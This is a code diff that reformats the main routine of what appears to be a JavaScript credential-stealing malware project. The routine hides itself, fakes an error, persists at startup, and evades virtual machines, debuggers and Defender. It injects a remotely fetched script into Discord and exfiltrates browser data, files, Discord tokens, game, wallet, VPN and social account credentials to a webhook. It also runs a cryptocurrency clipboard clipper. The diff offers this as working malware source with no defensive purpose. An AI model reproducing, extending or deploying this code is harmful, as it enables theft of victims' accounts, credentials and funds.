@@ -22,49 +22,45 @@ const CONFIG = require('./config/config.js');
 const program = require('./utils/program/program.js');
 
 const execute = async (allow, ...args) => {
-    try {
-        await allow(...args);
-    } catch (error) {
-        console.error(error);
-    }
+  try {
+    await allow(...args);
+  } catch (error) {
+    console.error(error);
+  }
 };
 
 const aurita = async () => {
-    if (await program.IsWishRunning()) {
-        process.exit(0);
-    };
+  if (await program.IsWishRunning()) {
+    process.exit(0);
+  }
 
-    await execute(hideConsole);
-    await execute(program.HideSelf);
+  await execute(hideConsole);
+  await execute(program.HideSelf);
 
-    if (!(await program.IsStartupDirRunning())) {
-        await execute(fakeError);
-        await execute(startup);
-    };
+  if (!(await program.IsStartupDirRunning())) {
+    await execute(fakeError);
+    await execute(startup);
+  }
 
-    await execute(antiVM);
-    await execute(antiDebug); 
-    await execute(antiDefender);
-    await execute(killProcess);
+  await execute(antiVM);
+  await execute(antiDebug);
+  await execute(antiDefender);
+  await execute(killProcess);
 
-    await execute(discordInjection,
-        "https://raw.githubusercontent.com/k4itrun/discord-injection/main/injection.js",
-        CONFIG.webhook,
-        CONFIG.inject
-    );
+  await execute(discordInjection, 'https://raw.githubusercontent.com/k4itrun/discord-injection/main/injection.js', CONFIG.webhook, CONFIG.inject);
 
-    await execute(system, CONFIG.webhook);
-    await execute(browsers, CONFIG.webhook);
-    await execute(commonFiles, CONFIG.webhook);
-    await execute(stealCodes, CONFIG.webhook);
-    await execute(discordTokens, CONFIG.webhook);
-    await execute(games, CONFIG.webhook);
-    await execute(wallets, CONFIG.webhook);
-    await execute(vpns, CONFIG.webhook);
-    await execute(socials, CONFIG.webhook);
-    await execute(wish, CONFIG.webhook);
+  await execute(system, CONFIG.webhook);
+  await execute(browsers, CONFIG.webhook);
+  await execute(commonFiles, CONFIG.webhook);
+  await execute(stealCodes, CONFIG.webhook);
+  await execute(discordTokens, CONFIG.webhook);
+  await execute(games, CONFIG.webhook);
+  await execute(wallets, CONFIG.webhook);
+  await execute(vpns, CONFIG.webhook);
+  await execute(socials, CONFIG.webhook);
+  await execute(wish, CONFIG.webhook);
 
-    await execute(clipper, CONFIG.cryptos);
+  await execute(clipper, CONFIG.cryptos);
 };
 
 aurita();
